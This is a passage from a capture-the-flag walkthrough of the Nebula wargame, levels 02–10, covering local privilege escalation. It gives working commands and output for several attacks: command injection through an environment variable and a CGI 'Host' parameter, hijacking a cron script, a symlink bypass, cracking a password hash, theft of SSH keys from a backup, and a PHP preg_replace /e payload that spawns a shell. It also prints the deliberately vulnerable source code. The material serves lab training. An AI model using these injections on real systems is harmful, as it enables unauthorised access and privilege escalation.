  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">buffer;</span>

  <span style="color: #66d9ef">gid_t</span> <span style="color: #f8f8f2">gid;</span>
  <span style="color: #66d9ef">uid_t</span> <span style="color: #f8f8f2">uid;</span>

  <span style="color: #f8f8f2">gid</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getegid();</span>
  <span style="color: #f8f8f2">uid</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">geteuid();</span>

  <span style="color: #f8f8f2">setresgid(gid,</span> <span style="color: #f8f8f2">gid,</span> <span style="color: #f8f8f2">gid);</span>
  <span style="color: #f8f8f2">setresuid(uid,</span> <span style="color: #f8f8f2">uid,</span> <span style="color: #f8f8f2">uid);</span>

  <span style="color: #f8f8f2">buffer</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">NULL;</span>

 <span style="color: #f8f8f2">asprintf(</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">buffer,</span> <span style="color: #e6db74">&quot;/bin/echo %s is cool&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">getenv(</span><span style="color: #e6db74">&quot;USER&quot;</span><span style="color: #f8f8f2">));</span>
  <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;about to call system(</span><span style="color: #ae81ff">\&quot;</span><span style="color: #e6db74">%s</span><span style="color: #ae81ff">\&quot;</span><span style="color: #e6db74">)</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">buffer);</span>
  
  <span style="color: #f8f8f2">system(buffer);</span>
<span style="color: #f8f8f2">}</span>
</pre></div>


<p>This is very similar to <em>Level01</em> but this time they seem to have patched the system call. However this time they&rsquo;ve added something to the statement that we have control over. Look at line 22 and think about how we can make use of that.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">level02@nebula:/home/flag02$ <span style="color: #f8f8f2">export USER</span><span style="color: #f92672">=</span><span style="color: #e6db74">&#39;&quot;&quot;;getflag&#39;</span>
level02@nebula:/home/flag02$ ./flag02
about to call system(&quot;/bin/echo &quot;&quot;;getflag is cool&quot;)

You have successfully executed getflag on a target account
</pre></div>


<h2 id="level-03:30500b9ac805cc116818bc6edd5ba7d1">Level 03</h2>

<blockquote>
<p>Check the home directory of flag03 and take note of the files there.</p>

<p>There is a crontab that is called every couple of minutes.</p>
</blockquote>

<p>So first things first let&rsquo;s take a look at that crontab</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">level03@nebula:/home/flag03$ cat writable.sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x &quot;$i&quot;)
	rm -f &quot;$i&quot;
done
</pre></div>


<p>Ok, so it will take a shell script in the <code>writeable.d</code> directory, execute it and then delete it. Luckily the directory is world read/write, allowing us to add out own script. As the crontab will run the script as the <code>flag03</code> user, we might as well just run the <code>getflag</code> from it. We&rsquo;ll capture some output to make sure it worked.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level03@nebula:/home/flag03$ cat writeable.d/getit
/bin/getflag &gt; /tmp/gotit
# <span style="color: #f8f8f2">wait </span><span style="color: #66d9ef">for</span> the script to run....
level03@nebula:/home/flag03$ cat /tmp/gotflag
You have successfully executed getflag on a target account
</pre></div>
</p>

<h2 id="level-04:30500b9ac805cc116818bc6edd5ba7d1">Level 04</h2>

<blockquote>
<p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)
<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>
<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
<span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;fcntl.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buf[</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">];</span>
  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">fd,</span> <span style="color: #f8f8f2">rc;</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(argc</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;%s [file to read]</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]);</span>
    <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strstr(argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">],</span> <span style="color: #e6db74">&quot;token&quot;</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">!=</span> <span style="color: #f8f8f2">NULL)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;You may not access &#39;%s&#39;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
    <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #f8f8f2">fd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">open(argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">],</span> <span style="color: #f8f8f2">O_RDONLY);</span>
  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(fd</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #f8f8f2">err(EXIT_FAILURE,</span> <span style="color: #e6db74">&quot;Unable to open %s&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #f8f8f2">rc</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">read(fd,</span> <span style="color: #f8f8f2">buf,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buf));</span>
  
  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(rc</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #f8f8f2">err(EXIT_FAILURE,</span> <span style="color: #e6db74">&quot;Unable to read fd %d&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">fd);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #f8f8f2">write(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">buf,</span> <span style="color: #f8f8f2">rc);</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</p>
</blockquote>

<p>Ok, so let&rsquo;s take a look at what happens when we run the file
<div class="highlight" style="background: #272822"><pre style="line-height: 125%">level04@nebula:/home/flag04$ ls
flag04  token
level04@nebula:/home/flag04$ ./flag04
./flag04 [file to read]
level04@nebula:/home/flag04$ ./flag04 token
You may not access &#39;token&#39;
</pre></div>
</p>

<p>So we can&rsquo;t access token. Looking at the code there&rsquo;s a check to see if the file is named <code>token</code>. We can&rsquo;t simply copy the <em>token</em> file because it&rsquo;s read only by the flag user. So there&rsquo;s only one thing for it: symlinks</p>

<p>Then get the flag (some ssh output cut for brevity)
<div class="highlight" style="background: #272822"><pre style="line-height: 125%">level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/myfile
level04@nebula:/home/flag04$ ./flag04 /tmp/myfile
06508b5e-8909-4f38-b630-fdb148a848a2
level04@nebula:/home/flag04$ ssh flag04@localhost

flag04@localhost&#39;s password:

flag04@nebula:~$ getflag
You have successfully executed getflag on a target account
</pre></div>
</p>

<p>So the output of the command is a <em>token</em> which is the term used for the password of the flag&rsquo;s user. Using this to logon as <em>flag04</em> and run <code>getflag</code>.</p>

<h2 id="level-05:30500b9ac805cc116818bc6edd5ba7d1">Level 05</h2>

<blockquote>
<p>Check the flag05 home directory. You are looking for weak directory permissions</p>
</blockquote>

<p>Ok, let&rsquo;s do that
<div class="highlight" style="background: #272822"><pre style="line-height: 125%">level05@nebula:~$ <span style="color: #f8f8f2">cd</span> ~flag05
level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     420 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
</pre></div>
</p>

<p>That <em>backup</em> directory looks like our target</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level05@nebula:/home/flag05$ <span style="color: #f8f8f2">cd</span> .backup/
level05@nebula:/home/flag05/.backup$ ls -la
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
level05@nebula:/home/flag05/.backup$ tar xvzf backup-19072011.tgz -C /tmp
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
</pre></div>
</p>

<p>Right so let&rsquo;s use these keys to login as <em>flag05</em>.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level05@nebula:/home/flag05/.backup$ ssh -i /tmp/.ssh/id_rsa flag05@localhost

flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
</pre></div>
</p>

<h2 id="level-06:30500b9ac805cc116818bc6edd5ba7d1">Level 06</h2>

<blockquote>
<p>The flag06 account credentials came from a legacy unix system.</p>
</blockquote>

<p>To cut a long story short, the way the password is stored for this user is not the same as for the other users. In older *nix systems the password was stored inside the <code>/etc/passwd</code> file. So let&rsquo;s take a look:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level06@nebula:/home/flag06$ cat /etc/passwd <span style="color: #f8f8f2">|</span> grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
</pre></div>
</p>

<p>Yep, there&rsquo;s the encrypted password. Grab that line and run it through John The Ripper</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# <span style="color: #f8f8f2">echo </span>flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh &gt; nebula.txt
root@kali:~# john nebula.txt  -show
flag06:hello:993:993::/home/flag06:/bin/sh

1 password hash cracked, 0 left
</pre></div>
</p>

<p>That&rsquo;s that, now back on the nebula box</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level06@nebula:/home/flag06$ ssh flag06@localhost

flag06@localhost&#39;s password: hello

getflag06@nebula:~$ getflag
You have successfully executed getflag on a target account
</pre></div>
</p>

<h2 id="level-07:30500b9ac805cc116818bc6edd5ba7d1">Level 07</h2>

<blockquote>
<p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>
</blockquote>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#!/usr/bin/perl</span>

<span style="color: #66d9ef">use</span> <span style="color: #f8f8f2">CGI</span> <span style="color: #e6db74">qw{param}</span><span style="color: #f8f8f2">;</span>

<span style="color: #66d9ef">print</span> <span style="color: #e6db74">&quot;Content-type: text/html\n\n&quot;</span><span style="color: #f8f8f2">;</span>

<span style="color: #66d9ef">sub </span><span style="color: #a6e22e">ping</span> <span style="color: #f8f8f2">{</span>
  <span style="color: #f8f8f2">$host</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">$_[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">];</span>

  <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;</span><span style="color: #f8f8f2">);</span>

  <span style="color: #f8f8f2">@output</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">`ping -c 3 $host 2&gt;&amp;1`</span><span style="color: #f8f8f2">;</span>
  <span style="color: #66d9ef">foreach</span> <span style="color: #f8f8f2">$line</span> <span style="color: #f8f8f2">(@output)</span> <span style="color: #f8f8f2">{</span> <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&quot;$line&quot;</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">}</span> 

  <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><span style="color: #f8f8f2">);</span>
  
<span style="color: #f8f8f2">}</span>

<span style="color: #75715e"># check if Host set. if not, display normal page, etc</span>

<span style="color: #f8f8f2">ping(param(</span><span style="color: #e6db74">&quot;Host&quot;</span><span style="color: #f8f8f2">));</span>
</pre></div>
</p>

<p>So the Nebula machine has a webserver running. Checking the config file we can see that it&rsquo;s running on port 7007. The script tells us that it&rsquo;s expecting a <code>Host</code> parameter. So let&rsquo;s hit the server from our web browser at the following URL (your IP will depend on what IP your VM has) <code>http://192.168.56.102:7007/index.cgi?Host=192.168.56.102</code></p>

<p>Basically I am pinging the same host. The webpage will display the output of the ping command.</p>

<p>We can&rsquo;t change the ping call, but we have control over what gets passed to the command. Let&rsquo;s craft a special URL</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">$&gt; curl http://192.168.56.102:7007/index.cgi?Host<span style="color: #f92672">=</span>127.0.0.1%20%26%26%20getflag
&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.117 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.028 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.035 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.028/0.060/0.117/0.040 ms
You have successfully executed getflag on a target account
</pre></div>
</p>

<p>Notice we need to encode the URL parms. The plaintext URL is <code>http://192.168.56.102:7007/index.cgi?Host=127.0.0.1 &amp;&amp; getflag</code></p>

<h2 id="level-08:30500b9ac805cc116818bc6edd5ba7d1">Level 08</h2>

<blockquote>
<p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>
</blockquote>

<p>Let&rsquo;s take a look then</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level08@nebula:/home/flag08$ ls -la
total 18
drwxr-x--- 1 flag08 level08   60 2014-06-14 14:10 .
drwxr-xr-x 1 root   root     500 2012-08-27 07:18 ..
-rw------- 1 flag08 flag08    13 2014-06-14 14:10 .bash_history
-rw-r--r-- 1 flag08 flag08   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag08 flag08  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 root   root    8302 2011-11-20 21:22 capture.pcap
-rw-r--r-- 1 flag08 flag08   675 2011-05-18 02:54 .profile
</pre></div>
</p>

<p>The only interesting file that&rsquo;s readable here is <code>capture.pcap</code>. Let&rsquo;s copy it out and use <em>Wireshark</em> to take a look at it.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">$&gt; scp level08@192.168.56.102:/home/flag08/capture.pcap .

level08@192.168.56.102&#39;s password:
capture.pcap                                  100% 8302     8.1KB/s   00:00
</pre></div>
</p>

<p>Once in Wireshark we can see a TCP stream. Right click on one of the entries and select <code>Follow TCP Stream</code>. A new window will appear in which we can see a login attempt. Red entries are user input, and blue entries are the server responses. The username is <code>level08</code>. The password is&hellip; well, take a look. Notice the <code>7f</code> entries. Those are deletes.</p>

<p><a href="http://i.imgur.com/IEseNUh.png">
<figure >
    
        <img src="http://i.imgur.com/IEseNUh.png" />
    
    
</figure>
</a></p>

<p>So&hellip;.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level08@nebula:/home/flag08$ ssh flag08@localhost

flag08@localhost&#39;s password: backd00Rmate

flag08@nebula:~$ getflag
You have successfully executed getflag on a target account
</pre></div>
</p>

<h2 id="level-09:30500b9ac805cc116818bc6edd5ba7d1">Level 09</h2>

<blockquote>
<p>There&rsquo;s a C setuid wrapper for some vulnerable PHP code&hellip;</p>
</blockquote>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">&lt;?php</span>

<span style="color: #66d9ef">function</span> <span style="color: #a6e22e">spam</span><span style="color: #f8f8f2">($email)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #f8f8f2">$email</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">preg_replace(</span><span style="color: #e6db74">&quot;/\./&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot; dot &quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$email);</span>
  <span style="color: #f8f8f2">$email</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">preg_replace(</span><span style="color: #e6db74">&quot;/@/&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot; AT &quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$email);</span>
  
  <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">$email;</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">function</span> <span style="color: #a6e22e">markup</span><span style="color: #f8f8f2">($filename,</span> <span style="color: #f8f8f2">$use_me)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #f8f8f2">$contents</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">file_get_contents($filename);</span>

  <span style="color: #f8f8f2">$contents</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">preg_replace(</span><span style="color: #e6db74">&quot;/(\[email (.*)\])/e&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;spam(</span><span style="color: #ae81ff">\&quot;\\</span><span style="color: #e6db74">2</span><span style="color: #ae81ff">\&quot;</span><span style="color: #e6db74">)&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$contents);</span>
  <span style="color: #f8f8f2">$contents</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">preg_replace(</span><span style="color: #e6db74">&quot;/\[/&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;&lt;&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$contents);</span>
  <span style="color: #f8f8f2">$contents</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">preg_replace(</span><span style="color: #e6db74">&quot;/\]/&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;&gt;&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$contents);</span>

  <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">$contents;</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #f8f8f2">$output</span> <span style="color: #f92672">=</span> <span style="color: #a6e22e">markup</span><span style="color: #f8f8f2">($argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">],</span> <span style="color: #f8f8f2">$argv[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">]);</span>

<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">$output;</span>

<span style="color: #75715e">?&gt;</span>
</pre></div>
</p>

<p>Let&rsquo;s run it to see what it actually does.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level09@nebula:/home/flag09$ <span style="color: #f8f8f2">echo</span> <span style="color: #f92672">[</span>email mail@test.com<span style="color: #f92672">]</span> &gt; /tmp/test.txt
level09@nebula:/home/flag09$ ./flag09 /tmp/test.txt fasdf
mail AT test dot com
</pre></div>
</p>

<p>So the vulnerable part here is the <code>preg_replace</code> with the <em>e</em> flag. For information on this see <a href="https://bugs.php.net/bug.php?id=35960">https://bugs.php.net/bug.php?id=35960</a>.</p>

<p>So there&rsquo;s a few ways we can exploit this. We basically need to pass a command to the script that will get executed in the <code>preg_replace</code>. Let&rsquo;s try to simply get a shell as the <em>flag09</em> user and get our flag.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level09@nebula:/home/flag09$ <span style="color: #f8f8f2">echo</span> <span style="color: #e6db74">&#39;[email ${${@system(&#39;</span>sh<span style="color: #e6db74">&#39;)}}]&#39;</span> &gt; /tmp/test.txt
level09@nebula:/home/flag09$ ./flag09 /tmp/test.txt fasdf
sh-4.2$ whoami
flag09
sh-4.2$ getflag
You have successfully executed getflag on a target account
</pre></div>
</p>

<h2 id="level-10:30500b9ac805cc116818bc6edd5ba7d1">Level 10</h2>

<blockquote>
<p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p>
</blockquote>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
<span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;fcntl.h&gt;</span>
<span style="color: #75715e">#include &lt;errno.h&gt;</span>
<span style="color: #75715e">#include &lt;sys/socket.h&gt;</span>
<span style="color: #75715e">#include &lt;netinet/in.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">file;</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">host;</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(argc</span> <span style="color: #f92672">&lt;</span> <span style="color: #ae81ff">3</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;%s file host</span><span style="color: #ae81ff">\n\t</span><span style="color: #e6db74">sends file to host if you have access to it</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]);</span>
    <span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #f8f8f2">file</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">];</span>
  <span style="color: #f8f8f2">host</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">];</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(access(argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">],</span> <span style="color: #f8f8f2">R_OK)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">fd;</span>
    <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">ffd;</span>
    <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">rc;</span>
    <span style="color: #66d9ef">struct</span> <span style="color: #f8f8f2">sockaddr_in</span> <span style="color: #f8f8f2">sin;</span>
    <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buffer[</span><span style="color: #ae81ff">4096</span><span style="color: #f8f8f2">];</span>

    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Connecting to %s:18211 .. &quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">host);</span> <span style="color: #f8f8f2">fflush(stdout);</span>

    <span style="color: #f8f8f2">fd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">socket(AF_INET,</span> <span style="color: #f8f8f2">SOCK_STREAM,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">);</span>

    <span style="color: #f8f8f2">memset(</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">sin,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">struct</span> <span style="color: #f8f8f2">sockaddr_in));</span>
    <span style="color: #f8f8f2">sin.sin_family</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">AF_INET;</span>
    <span style="color: #f8f8f2">sin.sin_addr.s_addr</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">inet_addr(host);</span>
    <span style="color: #f8f8f2">sin.sin_port</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">htons(</span><span style="color: #ae81ff">18211</span><span style="color: #f8f8f2">);</span>

    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(connect(fd,</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">sin,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">struct</span> <span style="color: #f8f8f2">sockaddr_in))</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Unable to connect to host %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">host);</span>
      <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
    <span style="color: #f8f8f2">}</span>

<span style="color: #75715e">#define HITHERE &quot;.oO Oo.\n&quot;</span>
    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(write(fd,</span> <span style="color: #f8f8f2">HITHERE,</span> <span style="color: #f8f8f2">strlen(HITHERE))</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Unable to write banner to host %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">host);</span>
      <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
    <span style="color: #f8f8f2">}</span>
<span style="color: #75715e">#undef HITHERE</span>

    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Connected!</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">Sending file .. &quot;</span><span style="color: #f8f8f2">);</span> <span style="color: #f8f8f2">fflush(stdout);</span>

    <span style="color: #f8f8f2">ffd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">open(file,</span> <span style="color: #f8f8f2">O_RDONLY);</span>
    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(ffd</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Damn. Unable to open file</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
      <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
    <span style="color: #f8f8f2">}</span>

    <span style="color: #f8f8f2">rc</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">read(ffd,</span> <span style="color: #f8f8f2">buffer,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buffer));</span>
    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(rc</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
